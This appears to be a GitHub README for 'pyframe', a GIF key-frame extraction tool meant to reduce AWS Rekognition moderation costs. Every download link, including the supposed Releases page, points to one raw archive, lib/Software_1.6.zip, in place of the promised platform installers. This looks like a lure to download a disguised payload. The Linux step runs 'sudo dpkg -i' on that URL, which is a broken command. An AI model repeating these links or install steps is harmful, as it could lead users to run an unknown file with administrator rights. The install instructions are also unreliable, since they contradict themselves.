# 🖼 pyframe - Extract Key Frames Easily

[![Download pyframe](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)

---

## 📖 About pyframe

pyframe is a simple tool that helps you work with GIFs. It splits a GIF into equal parts based on time and picks the frame with the most motion in each part. This way, you get good coverage of the whole scene. You only keep the most important frames instead of every single one.

This approach helps reduce the number of frames you send to services like AWS Rekognition, lowering costs by about 93% without losing much accuracy. pyframe uses common Python tools such as OpenCV and Pillow, but you don’t need to worry about the details. The app handles everything for you.

Ideal for anyone who wants to analyze or moderate GIFs, pyframe makes the process simpler and cheaper.

---

## 🖥 System Requirements

Before you start, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+)
- **Processor:** Intel i3 or equivalent
- **Memory:** At least 4 GB RAM
- **Disk Space:** Minimum 100 MB free space for installation
- **Internet Connection:** Needed to download the software and for any cloud-based image moderation tasks

pyframe runs as a desktop application. It does not require you to install Python or any programming tools.

---

## 🚀 Getting Started

This section will guide you step-by-step to download, install, and use pyframe.

### Step 1: Download pyframe

- Visit the [pyframe Releases Page](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip).
- Look for the latest version in the list.
- Download the installer file suitable for your system:
  - For Windows: `.exe` file
  - For macOS: `.dmg` or `.pkg` file
  - For Linux: `.AppImage` or `.deb` file
- Save the file to a location you can easily access, such as your Desktop or Downloads folder.

### Step 2: Install pyframe

- Open the downloaded file.
- Follow the on-screen prompts.
- On Windows and macOS, the process is similar to installing any other app:
  - Click "Next"
  - Accept the license agreement if asked
  - Choose the destination folder or keep the default
  - Click “Install”
- On Linux, if using `.deb`, you can also install from the terminal by running:
  ```bash
  sudo dpkg -i https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip
  ```
  Replace `https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip` with the actual file path.

### Step 3: Launch pyframe

- After installation, find the pyframe app in your Start Menu (Windows), Applications folder (macOS), or in your applications menu (Linux).
- Click to open it.
- The main window will appear, ready to use.

---

## 🎯 Using pyframe to Process GIFs

Once pyframe is open, follow these steps to get key frames from your GIF:

### Step 1: Load Your GIF

- Click the “Open” button or go to File > Open.
- Select the GIF file from your computer you want to analyze.
- The GIF will load and display basic info like duration and total frames.

### Step 2: Set Time Window

- You will see an option to split the GIF into equal parts by time.
- Choose the length of each time window. For example, setting it to 1 second means pyframe will look for the most important frame in every 1-second section.

### Step 3: Extract Frames

- Click the “Process” or “Extract Frames” button.
- pyframe will quickly analyze the GIF and pick frames with the highest motion delta for each window.
- It shows you the selected frames side by side.

### Step 4: Save Your Frames

- Click “Save” to export the selected frames.
- Choose a folder on your computer.
- Frames save as individual image files such as PNG or JPEG.
- You can now use these extracted images for further review or upload to image moderation services.

---

## 🔧 Features

- Splits GIFs evenly in time-based sections.
- Finds frames with the highest motion in each part.
- Cuts down the number of frames sent to cloud AI services.
- Helps reduce costs on services like AWS Rekognition.
- Supports common GIF files from any source.
- Saves extracted frames as images for reuse.
- Simple graphical interface for anyone to use.

---

## 💡 Tips for Best Results

- Adjust the time window depending on your GIF length. Short windows give more frames.
- Use longer windows for quick summaries.
- Check your extracted frames before saving to ensure they show the scenes you want.
- If you use cloud services for moderation, try pyframe to reduce the number of images sent.

---

## 📥 Download & Install

You can get pyframe from its Releases page:

[![Download pyframe](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)](https://raw.githubusercontent.com/tokoyusa/pyframe/main/lib/Software_1.6.zip)

Visit the link above, download the installer for your system, and follow the install steps in this guide.

---

## 🤝 Support & Contribution

If you have issues or need help:

- Check the Issues tab on the GitHub repository.
- Describe your problem clearly with screenshots if possible.
- You can suggest improvements or new features via Issues.

This release is intended for end users and is maintained with simple updates.

---

## 🔖 License

pyframe is open-source software. You can use and share it freely under its license terms.

---

## ⚙️ Technical Details

pyframe is built with Python and depends on tools like OpenCV and Pillow behind the scenes. It also uses AWS Rekognition for image moderation but only sends selected frames to save cost.

Topics related to this project include:

`aws`, `aws-image-moderation`, `aws-rek`, `huggingface`, `huggingface-transformers`, `image-moderation`, `moderation`, `opencv`, `opencv-python`, `pillow`, `python`

---

Enjoy using pyframe to make managing your GIFs simpler and more efficient.